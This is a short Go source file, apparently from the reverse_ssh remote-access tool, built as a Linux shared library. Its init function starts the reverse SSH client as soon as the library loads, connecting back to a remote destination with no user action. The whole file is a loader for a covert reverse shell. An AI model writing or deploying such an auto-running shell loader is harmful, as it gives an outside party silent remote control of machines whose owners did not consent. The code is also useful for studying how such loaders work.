//go:build linux && cgo && cshared

package main

import "github.com/NHAS/reverse_ssh/internal/client"

func init() {
	client.Run(destination, fingerprint, "")
}
